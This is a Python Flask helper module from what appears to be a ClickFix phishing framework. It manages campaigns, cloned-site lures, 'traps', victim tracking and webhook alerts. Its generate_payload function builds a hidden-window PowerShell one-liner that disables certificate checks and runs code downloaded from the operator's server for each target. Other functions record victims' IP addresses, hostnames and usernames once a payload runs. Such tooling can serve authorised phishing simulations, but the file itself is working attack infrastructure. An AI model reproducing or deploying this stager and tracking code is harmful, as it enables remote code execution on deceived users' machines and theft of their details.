import os
import re
import datetime
import logging
import requests
from functools import wraps
from flask import request, Response, current_app
from app.extensions import db
from app.models import Target, Event, Campaign

# --- Authentication Helper ---
def check_auth(username, password):
    """Check if a username/password combination is valid."""
    admin_user = current_app.config.get('ADMIN_USERNAME') or os.environ.get('ADMIN_USERNAME', 'admin')
    admin_pass = current_app.config.get('ADMIN_PASSWORD') or os.environ.get('ADMIN_PASSWORD', 'changeme_please')
    return username == admin_user and password == admin_pass

def authenticate():
    """Sends a 401 response that enables basic auth"""
    return Response(
    'Could not verify your access level for that URL.\n'
    'You have to login with proper credentials', 401,
    {'WWW-Authenticate': 'Basic realm="Login Required"'})

def requires_auth(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        auth = request.authorization
        if not auth or not check_auth(auth.username, auth.password):
            return authenticate()
        return f(*args, **kwargs)
    return decorated

# --- Helper Functions ---

def sanitize_filename(filename):
    """Sanitize a filename to prevent path traversal.
    
    Strips all directory components and allows only safe characters.
    WARNING: Do not add '/' back - it enables path traversal attacks.
    """
    # Extract just the filename, removing any path components
    basename = os.path.basename(filename)
    # Allow only alphanumeric, dot, dash, underscore
    clean = re.sub(r'[^a-zA-Z0-9.\-_]', '', basename)
    # Extra safety: prevent any sneaky traversal attempts
    while '..' in clean:
        clean = clean.replace('..', '')
    return clean

def generate_payload(user_id, server_url):
    """Generate a trackable PowerShell stager payload."""
    payload_endpoint = current_app.config.get('ENDPOINT_PAYLOAD', '/api/v2/config')
    if not payload_endpoint.startswith('/'): payload_endpoint = '/' + payload_endpoint
    if payload_endpoint.endswith('/'): payload_endpoint = payload_endpoint[:-1]
    
    return f'powershell -w h -c "[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {{$true}}; $wc = New-Object System.Net.WebClient; iex $wc.DownloadString(\'{server_url}{payload_endpoint}/{user_id}\')"'

def send_webhook(event_type, user_id, hostname=None, username=None):
    """Send a notification to the configured webhook."""
    webhook_url = current_app.config.get('WEBHOOK_URL')
    if not webhook_url:
        return

    payload = {
        "text": f"🚨 **ClickFix Alert** 🚨\n"
                f"**Event:** {event_type}\n"
                f"**User ID:** {user_id}\n"
                f"**IP:** {request.remote_addr}\n"
                f"**Time:** {datetime.datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S UTC')}"
    }

    if hostname:
        payload["text"] += f"\n**Host:** {hostname}\n**User:** {username}"

    try:
        requests.post(webhook_url, json=payload, timeout=5)
    except Exception as e:
        logging.error(f"Failed to send webhook: {e}")

def log_event(user_id, event_type, hostname=None, username=None):
    """Log an event to the database and send webhook."""
    target = Target.query.filter_by(user_id=user_id).first()
    
    # Determine platform from User-Agent
    user_agent = request.user_agent.string
    platform = "Unknown"
    if 'Windows' in user_agent:
        platform = "Windows"
    elif 'Macintosh' in user_agent:
        platform = "macOS"
    elif 'Linux' in user_agent:
        platform = "Linux"

    if target:
        event = Event(
            campaign_id=target.campaign_id,
            user_id=user_id,
            event_type=event_type,
            source_ip=request.remote_addr,
            hostname=hostname,
            username=username,
            user_agent=user_agent,
            platform=platform
        )
        db.session.add(event)
        db.session.commit()
        
        # Send webhook for critical events
        if event_type in ['BUTTON_CLICK', 'PAYLOAD_EXECUTED']:
            send_webhook(event_type, user_id, hostname, username)
    else:
        # Log event even if target not found (orphaned click or test)
        logging.warning(f"Unknown user_id {user_id} triggered {event_type}")

def get_scenarios_and_traps():
    """Helper to fetch available scenarios and traps for forms."""
    scenarios = []
    # Assuming app is initialized with template_folder='../templates'
    # current_app.root_path will be .../app
    lures_dir = os.path.join(current_app.root_path, '..', 'templates', 'lures')
    campaigns_dir = os.path.join(current_app.root_path, '..', 'templates', 'lures', 'scenarios')
    traps_dir = os.path.join(current_app.root_path, '..', 'templates', 'traps')

    # 1. Static Lures
    if os.path.exists(lures_dir):
        for entry in os.listdir(lures_dir):
            if entry.endswith('.html'):
                scenarios.append({'id': entry.replace('.html', ''), 'name': f"Lure: {entry.replace('.html', '')}"})
            elif os.path.isdir(os.path.join(lures_dir, entry)):
                scenarios.append({'id': entry, 'name': f"Lure: {entry}"})

    # 2. Cloned Campaigns
    if os.path.exists(campaigns_dir):
        for entry in os.listdir(campaigns_dir):
            if os.path.isdir(os.path.join(campaigns_dir, entry)):
                scenarios.append({'id': entry, 'name': f"Cloned Site: {entry}"})

    # --- FETCH AVAILABLE TRAPS ---
    traps = []
    if os.path.exists(traps_dir):
        for entry in os.listdir(traps_dir):
            if entry.endswith('.html'):
                traps.append({'id': entry.replace('.html', ''), 'name': entry.replace('.html', '').replace('_', ' ').title()})
    
    return scenarios, traps